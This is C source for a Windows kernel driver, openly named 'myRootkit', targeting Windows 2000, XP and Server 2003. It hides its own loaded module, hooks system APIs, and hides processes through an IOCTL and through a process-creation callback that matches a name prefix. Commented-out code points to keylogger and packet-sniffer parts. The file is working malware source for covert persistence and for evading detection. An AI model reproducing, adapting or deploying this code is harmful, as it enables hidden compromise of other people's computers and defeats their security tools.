#include <ntddk.h>

#include "rootkit.h"
#include "rk_Tools.h"
//#include "rk_keyboard.h"
#include "rk_DKOM.h"
#include "rk_Hook.h"
#include "IoControl.h"

// We are going to set this to point to PsLoadedModuleList.
PMODULE_ENTRY	gul_PsLoadedModuleList;  

PDEVICE_OBJECT	gp_DeviceObject = NULL;
//PDEVICE_OBJECT  gp_KeyboardDevice = NULL;
//ULONG			gp_NumPendingIrps = 0;
ULONG			gp_ProcNameOffset = 0;
PMODULE_ENTRY	gp_HiddenDriver = NULL;

//active config
ROOTKIT_SETUP_DATA	offsets = {0};

UNICODE_STRING hidePrefixW;
char *hidePrefixA;
char *masterPrefix;


//availble configs
//ROOTKIT_SETUP_DATA WIN2KSETUP		= { 0x0, 0x9C, 0xA0, 0x128, 0x8 , 0x54, 0x10, 0xA0 };
//ROOTKIT_SETUP_DATA WINXPSETUP		= { 0x0, 0x84, 0x88, 0xc4 , 0x0 , 0x1c, 0x8 , 0xA0 };
//ROOTKIT_SETUP_DATA WINXPSP2SETUP	= { 0x0, 0x84, 0x88, 0xc4 , 0x0 , 0x1c, 0x8 , 0xA0 };
//ROOTKIT_SETUP_DATA WIN2K3SETUP		= { 0x0, 0x84, 0x88, 0xc4 , 0x0 , 0x1c, 0x8 , 0xA0 };

ROOTKIT_SETUP_DATA WIN2KSETUP		= { 0x0, 0x9C, 0xA0, 0x128, 0x8 , 0x54, 0x10, 0xA0, 0x0c };
ROOTKIT_SETUP_DATA WINXPSETUP		= { 0x0, 0x84, 0x88, 0xc4 , 0x0 , 0x1c, 0x8 , 0xA0, 0x04 };
ROOTKIT_SETUP_DATA WINXPSP2SETUP	= { 0x0, 0x84, 0x88, 0xc4 , 0x0 , 0x1c, 0x8 , 0xA0, 0x04 };
ROOTKIT_SETUP_DATA WIN2K3SETUP		= { 0x0, 0x84, 0x88, 0xc4 , 0x0 , 0x1c, 0x8 , 0xA0, 0x04 };

NTSTATUS DispatchGeneral(IN PDEVICE_OBJECT DeviceObject,IN PIRP Irp);
NTSTATUS DriverEntry(IN PDRIVER_OBJECT  DriverObject,IN PUNICODE_STRING RegistryPath);
BOOLEAN SetupOffsets();

//Import NtBuildNumber from ntoskrnl.exe
__declspec(dllimport) ULONG NtBuildNumber;


VOID ProcessNotify(
	IN HANDLE  hParentId, 
	IN HANDLE  hProcessId, 
	IN BOOLEAN bCreate
	)
{
    PEPROCESS eproc = NULL;
    PCHAR processName = NULL;
    
    if (bCreate) {
       PsLookupProcessByProcessId( hProcessId , &eproc );
       if (eproc != NULL) {
          ULONG len = 0;
          len = strlen(masterPrefix);
  		  processName = (PCHAR) ( (ULONG)eproc + offsets.nameOffset );
  		  if (processName!= NULL) {
    		  if (strlen(processName) >= len) {
                  if (RtlCompareMemory( processName, masterPrefix, len ) == len) {
    //                DbgPrint("OnProcessHide\n");
                    OnProcessHide( (ULONG)hProcessId );                     
                  }
              }
          }
       }
       DbgPrint("On process create PID=%ld\n",hProcessId);
    }
    else
       DbgPrint("On process destroy PID=%ld\n",hProcessId); 
        
    return;    
}

NTSTATUS OnDriverCreate( IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp )
{
	NTSTATUS status = STATUS_SUCCESS;
	DbgPrint("ROOTKIT: OnDriverCreate\n");

	Irp->IoStatus.Status = status;
	Irp->IoStatus.Information = 0;
	IoCompleteRequest( Irp, IO_NO_INCREMENT );
	return status;
}

NTSTATUS OnDriverClose( IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp )
{
	NTSTATUS status = STATUS_SUCCESS;
	DbgPrint("ROOTKIT: OnDriverClose");

	Irp->IoStatus.Status = status;
	Irp->IoStatus.Information = 0;
	IoCompleteRequest( Irp, IO_NO_INCREMENT );	
	return status;
}

VOID OnUnload( IN PDRIVER_OBJECT DriverObject )
{
	PROOTKIT_EXT devExt;
	KTIMER kTimer;
	LARGE_INTEGER  timeout;
	UNICODE_STRING symbolicLink;

	DbgPrint("myRootkit: OnUnload called: %x \n",DriverObject);
	devExt = (PROOTKIT_EXT)DriverObject->DeviceObject->DeviceExtension; 
	
	UnHookApis();

	//Detach from the device underneath that we're hooked to
//	IoDetachDevice(devExt->PrevDevice);

//	DbgPrint("Keyboard device detached");

	//Create a timer
//	timeout.QuadPart = 1000000; //.1 s
//	KeInitializeTimer(&kTimer);

//	DbgPrint("Pending IRPs: %d\n",gp_NumPendingIrps);
//	
//	while(gp_NumPendingIrps > 0)
//	{
//		//Set the timer
//		KeSetTimer(&kTimer,timeout,NULL);
//		KeWaitForSingleObject(&kTimer, Executive, KernelMode, FALSE, NULL);
//	}
//		
//	devExt->bThreadRunning = FALSE; //we are stoping working thread

//	KeReleaseSemaphore(&devExt->semaphore, 0, 1, TRUE);

//	DbgPrint("Waiting for key logger thread to terminate...\n");
//	KeWaitForSingleObject(devExt->pThread, Executive, KernelMode, TRUE, NULL);
//	DbgPrint("Key logger thread termintated\n");

	//Close the log file
	ZwClose( devExt->hLogFile );

	//shut down NDIS
	//ShutDownNdis();

	//Delete symbolic link
	RtlInitUnicodeString( &symbolicLink, ROOTKIT_WIN32_DEV_NAME );
	IoDeleteSymbolicLink( &symbolicLink );

//	IoDeleteDevice(gp_KeyboardDevice);
	IoDeleteDevice(gp_DeviceObject);

	//Delete the device
//	IoDeleteDevice(DriverObject->DeviceObject);
    
    
	PsSetCreateProcessNotifyRoutine( ProcessNotify  , TRUE );

	DbgPrint("OnUnload leaved\n");

	ExFreePool( hidePrefixA );
	ExFreePool( masterPrefix);
}

NTSTATUS  Driver_IoControl( IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp )
{
	NTSTATUS status = STATUS_SUCCESS;
	PIO_STACK_LOCATION irpStack; 
	ULONG inputSize;
	ULONG controlCode;
	PVOID pInputBuffer;

//	if ( DeviceObject == gp_KeyboardDevice ) {
//		//tutaj przekazujemy Irp dla nastepnego w lanuchu drivera
//		return CompleteKeyboard(Irp);
//	}

	//now we only service OUR driver IOCTLS

	irpStack = IoGetCurrentIrpStackLocation( Irp );
	controlCode = irpStack->Parameters.DeviceIoControl.IoControlCode;
	inputSize = irpStack->Parameters.DeviceIoControl.InputBufferLength;
	pInputBuffer = Irp->AssociatedIrp.SystemBuffer;

	switch (controlCode) 
	{
	case IOCTL_LOGIN:
		DbgPrint("Login\n");
		break;

	case IOCTL_LOGOUT:
		DbgPrint("Logout\n");
		break;

	case IOCTL_HIDE_PROCESS:
		DbgPrint("Before IOCTL_HIDE_PROCESS\n");
		if (inputSize == sizeof(ULONG)) {
			DbgPrint("Lets hide something...");
			OnProcessHide( *(ULONG*)pInputBuffer );
		}
		break;

	default:
		break;
	}	

	Irp->IoStatus.Status = status;
	Irp->IoStatus.Information = 0;
	IoCompleteRequest( Irp , IO_NO_INCREMENT );
	return status;
}

//----------------------------------------------------------------------------------------
//	DriverEntry
//----------------------------------------------------------------------------------------
//
//
//----------------------------------------------------------------------------------------
NTSTATUS DriverEntry( IN PDRIVER_OBJECT driverObject, IN PUNICODE_STRING theRegistryPath )
{	
	NTSTATUS		status = STATUS_SUCCESS;
	UNICODE_STRING	deviceName;
	UNICODE_STRING	symbolicName;
	ULONG i;
	ULONG m,j,k;
	ULONG procNotifyCount;

	DbgPrint("Entered DriverEntry: %x",driverObject);

	driverObject->DriverUnload  = OnUnload;

	//wypelniamy tablice
	for (i = 0; i < IRP_MJ_MAXIMUM_FUNCTION; i++) {
        driverObject->MajorFunction[i] =DispatchGeneral;
    }

	//do obslugi klawiatury
//	driverObject->MajorFunction[IRP_MJ_READ				] =	KeyBoardDispatchRead;
	
	//
	driverObject->MajorFunction[ IRP_MJ_CREATE			] = OnDriverCreate;
	driverObject->MajorFunction[ IRP_MJ_CLOSE			] = OnDriverClose;
	driverObject->MajorFunction[ IRP_MJ_DEVICE_CONTROL	] = Driver_IoControl; 

	//unicode names initialization
	RtlInitUnicodeString( &deviceName, ROOTKIT_DEV_NAME );
	RtlInitUnicodeString( &symbolicName, ROOTKIT_WIN32_DEV_NAME );

	//we are creating communication object that GUI can use to send requsts to driver
	status = IoCreateDevice( driverObject, sizeof( ROOTKIT_EXT ),
								&deviceName,
								FILE_DEVICE_UNKNOWN,			
								0,
								TRUE,							//we allow for only one client
								&driverObject->DeviceObject);

	if (status == STATUS_OBJECT_NAME_EXISTS)
		DbgPrint("STATUS_OBJECT_NAME_EXISTS\n");
	if (status == STATUS_OBJECT_NAME_COLLISION)
		DbgPrint("STATUS_OBJECT_NAME_COLLISION\n");

	if (status!=STATUS_SUCCESS) {
		DbgPrint("myRootkit: IoCreateDeviceFailed\n");
		return status;
	}

	status = IoCreateSymbolicLink( &symbolicName, &deviceName );
	if (status!=STATUS_SUCCESS) {
		DbgPrint("IoCreateSymbolicLink failed\n");
		return status;
	}

	hidePrefixA = ExAllocatePool( NonPagedPool, 20);
	if (hidePrefixA == NULL) {
		return STATUS_UNSUCCESSFUL;
	}
	strcpy( hidePrefixA , "myRootkit");
	DbgPrint( "hidePrefixA %s\n",hidePrefixA);

	masterPrefix = ExAllocatePool( NonPagedPool, 10);
	if (masterPrefix == NULL) {
		return STATUS_UNSUCCESSFUL;
	}
	
	strcpy( masterPrefix , "bill");
	DbgPrint( "masterPrefix %s\n",masterPrefix);

	RtlInitUnicodeString( &hidePrefixW, L"myRootkit");	

	gp_DeviceObject = driverObject->DeviceObject;

    //tutaj tworzymy urzadzenie dla klawiatury oraz inicjujemy
//	KeyboardInit( driverObject, &gp_KeyboardDevice);
//	SetupKeylogger( gp_KeyboardDevice );	

	//setup specific system characterisitc
	gp_ProcNameOffset  = GetProcessNameOffset();

	if ( SetupOffsets( gp_ProcNameOffset ) == FALSE ) {
		DbgPrint("OS Unsupported! Quiting");
		return STATUS_UNSUCCESSFUL;
	}

//	procNotifyCount = PspCreateProcessNotifyRoutineCount;
//	DbgPrint("PspCreateProcessNotifyRoutineCount: %d",procNotifyCount);

//	HookNtDeviceIoControl();

	gul_PsLoadedModuleList =  (PMODULE_ENTRY)FindPsLoadedModuleList(driverObject);

//	gp_HiddenDriver = PatchNtoskrnlImageSize( gul_PsLoadedModuleList );

	HideModule();

	//starts up packet sniffer code...
//	SetupNdis();

	SetupIndexes();
	HookApis();
	
	PsSetCreateProcessNotifyRoutine( ProcessNotify , FALSE );

	DbgPrint("DriverEntry leaved\n");
	return status;
}

NTSTATUS AbandonRequest(PIRP Irp)
{
	DbgPrint("AbandonRequest\n");
	Irp->IoStatus.Status = STATUS_ACCESS_DENIED;
	Irp->IoStatus.Information = 0;
	IoCompleteRequest(Irp, IO_NO_INCREMENT);
	return STATUS_ACCESS_DENIED;
}

NTSTATUS CompleteRequest(PIRP Irp)
{
	Irp->IoStatus.Status = STATUS_SUCCESS;
	Irp->IoStatus.Information = 0;
	IoCompleteRequest(Irp, IO_NO_INCREMENT);
	//Irp->IoStatus.Status is gone!!! after we call IoCompleteRequest
	return STATUS_SUCCESS;
}

NTSTATUS DispatchGeneral(IN PDEVICE_OBJECT DeviceObject,IN PIRP Irp)
{
	if (DeviceObject == gp_DeviceObject) {
		//dla wlasnego drivera konczymy przetwarzanie IRP
		DbgPrint("Dispach general: DeviceObject: %x \n",DeviceObject);
		return CompleteRequest(Irp);
	}
	
    DbgPrint("TO SIE NIE POWINNO WYWOLAC NIGDY\n");
 
    return STATUS_UNSUCCESSFUL; 
//	// ten IRP jest dla klawiatury
//
//    //
//    // Przepuszczamy IRP do nastepnego drivera w lancuch bez modyfikowania
//    //
//	else
//	if (DeviceObject == gp_KeyboardDevice) {
//		DbgPrint("Dispach general: KeyboardDeviceObject: %x \n",DeviceObject);
//		return CompleteKeyboard( Irp );
//	}
//	else
//		DbgPrint("Dispach general else: DeviceObject: %x \n",DeviceObject);
//
//	// to sie nie powinno wywolywac NIGDY !
//    IoSkipCurrentIrpStackLocation(Irp);
//    return IoCallDriver(((PROOTKIT_EXT) DeviceObject->DeviceExtension)->PrevDevice, Irp);
}

//NTSTATUS CompleteKeyboard(IN PIRP Irp)
//{
//    NTSTATUS stat = STATUS_SUCCESS;
//	IoSkipCurrentIrpStackLocation(Irp);
//	__try
//    {
////  	      status = IoCallDriver(((PROOTKIT_EXT)gp_KeyboardDevice)->PrevDevice, Irp);
//  	      stat = IoCallDriver(((PROOTKIT_EXT)gp_KeyboardDevice->DeviceExtension)->PrevDevice, Irp);
//    }
//    __except (EXCEPTION_EXECUTE_HANDLER) 
//    {
//          DbgPrint("!!!! HANDLED EXCEPTION   !!!!\n");
//          stat = STATUS_UNSUCCESSFUL;
//    }
//
//	return stat;
//}

BOOLEAN SetupOffsets(ULONG nameOffset)
{
	ULONG BuildNumber = (NtBuildNumber & 0x0000FFFF);

	switch (BuildNumber)
	{
	case 2195:
		offsets = WIN2KSETUP;
		break;

	case 2600:
		DbgPrint("WinXPSP1 recongnized");
		offsets = WINXPSETUP;
		break;

	case 3790:		
		DbgPrint("Win2k3 recongnized");
		offsets = WIN2K3SETUP;
		break;
	//... other OSes

	default:
		return FALSE;
		break;
	}

	//sets name offset
	offsets.nameOffset = nameOffset;

	return TRUE;
}
